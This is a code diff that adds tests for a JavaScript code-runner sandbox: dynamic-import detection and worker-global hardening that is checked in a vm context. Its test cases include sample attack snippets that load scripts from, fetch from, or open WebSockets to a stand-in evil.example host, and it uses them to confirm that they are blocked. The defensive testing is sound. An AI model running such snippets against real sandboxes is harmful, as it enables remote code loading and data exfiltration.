@@ -10,10 +10,13 @@
  */
 import assert from 'node:assert/strict';
 import { describe, it } from 'node:test';
+import vm from 'node:vm';
 import {
   RUN_TIMEOUT_MS,
+  applyWorkerHardening,
   buildWorkerSource,
   isRunnableLanguage,
+  rejectsDynamicImport,
   runUserCode,
 } from '../src/lib/codeRunner.js';
 
@@ -96,6 +99,181 @@ describe('buildWorkerSource', () => {
   it('embeds user code safely as a JSON string', () => {
     const source = buildWorkerSource('console.log("hi"); // </script>');
     assert.ok(source.includes(JSON.stringify('console.log("hi"); // </script>')));
+  });
+
+  it('embeds the same hardening function the tests exercise (no drift)', () => {
+    const source = buildWorkerSource('1');
+    assert.ok(source.includes(applyWorkerHardening.toString().slice(0, 80)));
+  });
+});
+
+describe('rejectsDynamicImport', () => {
+  it('rejects real dynamic imports including obfuscated spacing', () => {
+    for (const code of [
+      'import("https://evil.example/x.js")',
+      "await import('https://evil.example/x.js')",
+      'const m = await import\n("x")',
+      'import /**/ ("x")',
+      'import/*c*/("x")',
+      'x = import ("x")',
+      'f(`${await import("x")}`)',
+    ]) {
+      assert.equal(rejectsDynamicImport(code), true, code);
+    }
+  });
+
+  it('allows strings, comments, static imports, and lookalikes', () => {
+    for (const code of [
+      'const s = "import(";',
+      "const s = 'import(\"x\")';",
+      '// import("x")\nconst a = 1;',
+      '/* import("x") */ const a = 1;',
+      '`text import( text`',
+      'import x from "y";',
+      'import * as ns from "y";',
+      'import.meta.url;',
+      'important(',
+      'const re = /ab+c/;',
+      '',
+      null,
+    ]) {
+      assert.equal(rejectsDynamicImport(code), false, String(code));
+    }
+  });
+});
+
+describe('applyWorkerHardening (behavioral, vm-backed)', () => {
+  function workerLikeGlobal() {
+    const network = () => {
+      throw new Error('network must be unreachable');
+    };
+    const proto = {};
+    Object.defineProperty(proto, 'fetch', { get: () => network, configurable: true });
+    proto.WebSocket = function WebSocket() {
+      throw new Error('network must be unreachable');
+    };
+    proto.XMLHttpRequest = function XMLHttpRequest() {
+      throw new Error('network must be unreachable');
+    };
+    proto.eval = (x) => x;
+    const scope = Object.create(proto);
+    scope.Function = function Function() {
+      throw new Error('no string constructor');
+    };
+    scope.importScripts = () => {
+      throw new Error('no script loading');
+    };
+    scope.WebAssembly = {};
+    scope.Worker = function Worker() {};
+    scope.navigator = {
+      sendBeacon: () => true,
+      serviceWorker: {},
+      locks: {},
+      storage: {},
+      clipboard: {},
+    };
+    scope.console = { log() {}, error() {}, warn() {} };
+    scope.postMessage = () => {};
+    scope.self = scope;
+    return { scope, proto };
+  }
+
+  it('neutralizes own, proto-chain, and navigator APIs', () => {
+    const { scope, proto } = workerLikeGlobal();
+    const neutralized = applyWorkerHardening(scope);
+    assert.ok(neutralized.length > 0);
+    assert.equal(scope.fetch, undefined);
+    assert.equal(Object.getPrototypeOf(scope).fetch, undefined);
+    assert.equal(proto.fetch, undefined);
+    assert.equal(scope.WebSocket, undefined);
+    assert.equal(scope.XMLHttpRequest, undefined);
+    assert.equal(scope.eval, undefined);
+    assert.equal(scope.Function, undefined);
+    assert.equal(scope.importScripts, undefined);
+    assert.equal(scope.WebAssembly, undefined);
+    assert.equal(scope.Worker, undefined);
+    assert.equal(scope.navigator.sendBeacon, undefined);
+    assert.equal(scope.navigator.serviceWorker, undefined);
+    assert.equal(scope.navigator.locks, undefined);
+    assert.equal(scope.navigator.storage, undefined);
+    assert.equal(scope.navigator.clipboard, undefined);
+  });
+
+  it('attack snippets throw inside a hardened context', () => {
+    const { scope } = workerLikeGlobal();
+    applyWorkerHardening(scope);
+    const ctx = vm.createContext(scope);
+    // NOTE: vm-realm errors fail cross-realm `instanceof`, so assert on
+    // the error name (realm-safe) instead of the constructor.
+    const throwsNamed = (fn, snippet) => {
+      try {
+        fn();
+      } catch (err) {
+        assert.ok(
+          err && (err.name === 'TypeError' || err.name === 'ReferenceError'),
+          `${snippet} threw ${err && err.name}`,
+        );
+        return;
+      }
+      assert.fail(`${snippet} did not throw`);
+    };
+    for (const snippet of [
+      'fetch("https://evil.example/x")',
+      'Object.getPrototypeOf(self).fetch("https://evil.example/x")',
+      'eval("1+1")',
+      'Function("return 1")',
+      'new WebSocket("wss://evil.example/x")',
+      'new XMLHttpRequest()',
+      'navigator.sendBeacon("/x")',
+      'importScripts("https://evil.example/x.js")',
+    ]) {
+      throwsNamed(() => vm.runInContext(snippet, ctx), snippet);
+    }
+  });
+
+  it('legitimate code keeps working in a hardened context', () => {
+    const { scope } = workerLikeGlobal();
+    applyWorkerHardening(scope);
+    const ctx = vm.createContext(scope);
+    assert.equal(vm.runInContext('1 + 2', ctx), 3);
+    assert.equal(vm.runInContext('Math.max(1, 2)', ctx), 2);
+    assert.deepEqual([...vm.runInContext('Object.keys({ a: 1 })', ctx)], ['a']);
+    assert.equal(vm.runInContext('JSON.stringify({ a: 1 })', ctx), '{"a":1}');
+    assert.equal(vm.runInContext('typeof setTimeout', ctx), 'undefined');
+  });
+
+  it('the shipped worker source behaves end-to-end in a fake worker global', async () => {
+    const posted = [];
+    const scope = {
+      console: { log() {}, error() {}, warn() {} },
+      postMessage: (msg) => {
+        posted.push(msg);
+      },
+    };
+    scope.self = scope;
+    const ctx = vm.createContext(scope);
+    vm.runInContext(buildWorkerSource('console.log("hi")'), ctx);
+    await scope.onmessage({ data: {} });
+    assert.equal(posted.length, 1);
+    assert.equal(posted[0].ok, true);
+    assert.equal(posted[0].output, 'hi');
+  });
+
+  it('the shipped worker source turns network attacks into errors, not sends', async () => {
+    const posted = [];
+    const scope = {
+      console: { log() {}, error() {}, warn() {} },
+      postMessage: (msg) => {
+        posted.push(msg);
+      },
+    };
+    scope.self = scope;
+    const ctx = vm.createContext(scope);
+    vm.runInContext(buildWorkerSource('fetch("https://evil.example/x")'), ctx);
+    await scope.onmessage({ data: {} });
+    assert.equal(posted.length, 1);
+    assert.equal(posted[0].ok, false);
+    assert.ok(/Error:/.test(posted[0].output));
   });
 });
 
